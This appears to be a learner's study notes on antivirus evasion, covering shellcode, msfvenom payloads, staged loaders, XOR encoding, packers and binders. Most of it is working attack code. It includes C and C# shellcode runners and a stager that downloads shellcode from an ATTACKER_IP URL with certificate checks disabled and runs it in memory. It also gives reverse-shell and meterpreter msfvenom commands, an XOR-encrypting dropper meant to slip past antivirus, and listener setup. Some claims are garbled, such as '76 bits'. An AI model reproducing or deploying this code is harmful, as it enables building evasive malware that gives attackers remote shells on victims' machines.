

## Challenge

## PE Structure

#### What is PE ? 

- Portable Execution format allows Windows and the DOS loaders to load the file in memory.
- It contains links to addresses in memory, pointers, metadata information, etc 


**Data Containers in the PE Structure** 

- text - actual code of the program
- data - initalized variables and defined variables
- bss - uninitialized variables
- rdata - read only data
- edata - portable objects and related table information 
- idata - imported objects
- reloc - image relocation information
- rsrc - links external resources used by the program, images, manifest files, embedded binaries. 

## Introduction to Shellcode

**Shell Code**

- Machine crafted instructions that usually create a shell or reverse shell on the target machine. 
- Shellcode modifies the register and function of a program to execute the attackers code. 
- Generally written in assembly

**Creating Simple Shellcode**

Compile the assembly code using nasm
f - specify whether to compile into 32 or 76 bits
Use the ld command to link the object
Execute the file
```
nasm -f elf64 <file_name>.asm
ld <file_name>.o -o <file_name> 
./<file_name>
```

Extract the shell code by copying the .text file from the output
```
objdump -d <file_name>
```

Copy the text section into a .txt file
O - the data should be in binary format
```
objcopy .text -O binary <file_name> <file_name>.txt
```

Convert binary to hexidecimal format 
i - will display the binary from the text file in hexidecimal 
```c
xxd -i <file_name>.txt

unsigned char new_text[] = {
  0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00,
  0x5e, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00,
  0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff,
  0xff, 0x54, 0x48, 0x4d, 0x2c, 0x20, 0x52, 0x6f, 0x63, 0x6b, 0x73, 0x21,
  0x0d, 0x0a
};
unsigned int new_text_len = 50;
```

The displayed C string variable can be input into a C program. 
e.g.
```c
#include <stdio.h>

int main(int argc, char **argv) {
    unsigned char message[] = {
        0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00,
        0x5e, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00,
        0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff,
        0xff, 0x54, 0x48, 0x4d, 0x2c, 0x20, 0x52, 0x6f, 0x63, 0x6b, 0x73, 0x21,
        0x0d, 0x0a
    };
    
    (*(void(*)())message)();
    return 0;
}
```

The code can then be compiled and executed 
```
gcc -g -Wall -z execstack <file_name>.c -o <output_file>
```


## Generate Shellcode

Use msfvenom to generate shellcode that executes the calculator application
a - the x86 architecture
platform - windows or linux 
p - what type of payload
cmd - the appplication to execute
f - the file type
```
msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c
```


A small C program to inject the shellcode into calc.exe 
Import the windows header file 
Create an array of char (string), for the shell code 
In the main function allocate space for the stager
Create a pointer variable of int, pointing to the stager payload ? 
Execute the shellcode via the pointer. 
```c
#include <windows.h>
char stager[] = {
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00" };
int main()
{
        DWORD oldProtect;
        VirtualProtect(stager, sizeof(stager), PAGE_EXECUTE_READ, &oldProtect);
        int (*shellcode)() = (int(*)())(void*)stager;
        shellcode();
}
```

Convert c file into exec to be executed in Windows
```
i686-w64-mingw32-gcc calc.c -o calc-MSF.exe
```


**Storing Shellcode in bin Files**

Use msfvenom to create a bin payload
a - x86 architecture 
platform - platform that the payload will run on
p - windows payload type
cmd - the executable to run in windows
f - type of data
```shell
msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw > /tmp/example.bin
```

Convert the binary data into hexidecminal 
```c
xxd -i example.bin

unsigned char _tmp_example_bin[] = {
  0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64,
  0x8b, 0x50, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28,
  0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c,
  0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52, 0x57, 0x8b, 0x52,
  0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01, 0xd1,
  0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49,
  0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01,
  0xc7, 0x38, 0xe0, 0x75, 0xf6, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75,
  0xe4, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b,
  0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24,
  0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a,
  0x8b, 0x12, 0xeb, 0x8d, 0x5d, 0x6a, 0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00,
  0x00, 0x50, 0x68, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5,
  0xa2, 0x56, 0x68, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x3c, 0x06, 0x7c,
  0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
  0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65,
  0x00
};
unsigned int _tmp_example_bin_len = 193;
```


I was confused as to why I needed to convert the shellcode into hexidecimal. 
But if you want to place the shellcode into a C program for example, you can't do this with binary. 
The C program still needs to allocate the memory on the Windows machine to inject the shellcode. 
## Staged Payloads 

**Stageless Payloads**

- Stageless payloads have only one step in terms of infecting an application. 
- When the payload first executes it will often create a reverse shell back to the attacker's machine, and that's it.

**Staged Payloads** 

- For staged payloads, there are often two steps. 
- The first step, step0 will create a reverse shell to the attacker's machine.
- Then the attacker or due to an automated process will drop a second payload to to placed in memory. 

**Staged vs Stageless**

- Stageless can be harder to detect by AV since the first payload is usually only a reverse shell, while the second payload dropped only runs in memory. 
- A staged payload can be easily be detected by AVs since it's typically a larger file, being both a reverse shell and the added. 

**Stagers in Metasploit** 

stageless payload - windows/x64/shell_reverse_tcp
staged payload - windows/x64/shell/reverse_tcp


VirtualAlloc - reserve memory for the shellcode 
CreateThread - Create a thread from the current process
WaitForSignleObject - Used for thread synchronisation, waits for another thread before finishing

WebClient - create a webclient object to make a request to download the shellcode 
ServerCertificateValidcationCallback - Ignore SSL verification
DownloadData = Download the shellcode from the specified URL

PAGE_EXECUTE_READWRITE - make the shellcode in memory executable
Marshal.Copy - copy the shellcode variable to another

WaitForSingleObject - Waits for the shellcode to execute before closing the program
```csharp
using System;
using System.Net;
using System.Text;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class Program {
  //https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  //https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

  public static void Main()
  {
    string url = "https://ATTACKER_IP/shellcode.bin";
    Stager(url);
  }

  public static void Stager(string url)
  {

    WebClient wc = new WebClient();
    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

    byte[] shellcode = wc.DownloadData(url);

    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);

  }
}
```

**Create payload for the Stager to Grab**

Create a payload with msfvenom 
p - the payload is stageless
LHOST - the IP address the payload should try to and connect to 
LPORT - the port the payload should try and connect to
f - binary format 
o - the output name of the binary file
b - ? 
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7474 -f raw -o shellcode.bin -b '\x00\x0a\x0d'
```

Use the openssl command to generate a local private and public key to a host a web server
```shell
openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
```

Use python to create a web server on port 443 (to look legitimate) and using the ssl certs
```shell
python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
```

Set up a netcat listener for when the last reverse shell wants to connect to the attacker's machine
```shell
user@AttackBox$ nc -lvp 7474
```

## Introduction to Encoding and Encryption 

**What is Encoding**

- Converting data to another state or format. 
- This is used for program compiling, data transmissions., and data processing
- Encoding can be seen as way for certain applications to talk to each other if their base communication isn't the same. 
- For example, to evade anti virus, you could hide shellcode in binary. 

**What is Encryption**

- From a computer science standpoint this keeps data from being manipulated by protecting it via passwords or  similar methods. 
- Encryption is mostly done by a shared key or public and private keys. 
- Non encrypted text is known as plain text, while encrypted text is known as cipher text

## Shellcode Encoding and Encryption 

#### Encoding using MSFVenom

List out encoders available from msfvenom
```shell
msfvenom --list encoders | grep excellent
```

Utilize msfvenom to create a csharp program encrypted with shikata_ga_nai
a - x86 architecture
platform - Create a payload for the windows platform 
LHOST - the IP address the reverse shell will connect to
LPORT - the port the reverse shell will connect to
p - the payload to use, in this case a stageless reverse tcp connection
e - encoding the payload with shikata ga nai ? 
b - ? 
i - encode the payload with 3 iterations
f - the file type will be csharp
```shell
msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp
```


#### Encrypted using MSFVenom

List out available encryption algos for msfvenom
```bash
msfvenom --list encrypt
```

Create a payload with msfvenom
p - Create a staged reverse tcp payload
LHOST - the attacker's ip address the reverse shell will connect to 
LPORT - the attacker's port the reverse shell will connect to
p - the file type the payload will be generated as, in this case exe
encrypt - encryption method to use, in this case xor 
encryption-key - the encryption key to use
o - the name of the newly generated payload 
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key "MyZekr3tKey***" -o xored-revshell.exe
```

#### Creating a Custom Payload

Using msfvenom create a payload in csharp
LHOST - the attacker's IP address
LPORT - the attacker's port number
p - the payload type, in this case a stagless payload
f - the file type, in this case csharp
```bash
 msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp
```

A C# program to encode the shell code above using the key stated in the program. 
Then uses xor to further encode the shellcode. 
```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Encrypter
{
    internal class Program
    {
        private static byte[] xor(byte[] shell, byte[] KeyBytes)
        {
            for (int i = 0; i < shell.Length; i++)
            {
                shell[i] ^= KeyBytes[i % KeyBytes.Length];
            }
            return shell;
        }
        static void Main(string[] args)
        {
            //XOR Key - It has to be the same in the Droppr for Decrypting
            string key = "THMK3y123!";

            //Convert Key into bytes
            byte[] keyBytes = Encoding.ASCII.GetBytes(key);

            //Original Shellcode here (csharp format)
            byte[] buf = new byte[460] { 0xfc,0x48,0x83,..,0xda,0xff,0xd5 };

            //XORing byte by byte and saving into a new array of bytes
            byte[] encoded = xor(buf, keyBytes);
            Console.WriteLine(Convert.ToBase64String(encoded));        
        }
    }
}

```

Convert the encoding file into a executable
```powershell
C:\> csc.exe Encrypter.cs
```

Add the decryption side part of the program. 
Utilizing the methods from the other program of encoding and encrypting the shellcode we can then create another program that unencodes the shellcode. 
We have the key and method to run the decryption before the shellcode executes. 
So upload the file, the AV runs to find find malicious code which it can't because it's encoded. The program runs decodes the shellcode, then executes it.
```csharp

using System;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;

public class Program {
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
  
  private static byte[] xor(byte[] shell, byte[] KeyBytes)
        {
            for (int i = 0; i < shell.Length; i++)
            {
                shell[i] ^= KeyBytes[i % KeyBytes.Length];
            }
            return shell;
        }
  public static void Main()
  {

    string dataBS64 = "qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=";
    byte[] data = Convert.FromBase64String(dataBS64);

    string key = "THMK3y123!";
    //Convert Key into bytes
    byte[] keyBytes = Encoding.ASCII.GetBytes(key);

    byte[] encoded = xor(data, keyBytes);

    UInt32 codeAddr = VirtualAlloc(0, (UInt32)encoded.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(encoded, 0, (IntPtr)(codeAddr), encoded.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);

  }
}
```

Convert the C# code into an executable
```powershell
C:\> csc.exe EncStageless.cs
```

Create a netcat listener on the attacker's machine to catch the connection made by the shellcode.
```bash
nc -lvp 443
```
## Packers 

**Packers** 

- Used to compress a program to take up less space
- Protect a program from being reversed engineered 
- Packing includes compressing, encrypting, and debugging protections
- Some packers include, UPX, MPRESS, Themida, and others
- Usually a function called a packing function
- Code needs to be easily reversed by an unpacking function
- The packer embeds a code stub that contains an unpacker and a entry point to it. 

**Packers and AVs**

- By using packers the shellcode becomes unrecognizable
- Although, if the unpacker matches a malicious signature it will alert the AV or EDR.
- Once the code is unpacked and placed in memory it can be caught by EDR systems if it were to monitor activity in the memory.

```csharp
using System;
using System.Net;
using System.Text;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class Program {
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

  public static void Main()
  {
    byte[] shellcode = new byte[] {0xfc,0x48,0x83,...,0xda,0xff,0xd5 };


    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);

  }
}
```

## Binders


- A way to combine to executables together, making the victim think that they're executing a different application. 
- An example of this would be modifying the entry point in the PE header to execute some code before the main program.
- Binders don't hide your code from AV's its rather for tricking the end user into thinking they aren't running malicious code. 
- Binders can be used in addition to packers, encryption, encoders and stage or stagless payloads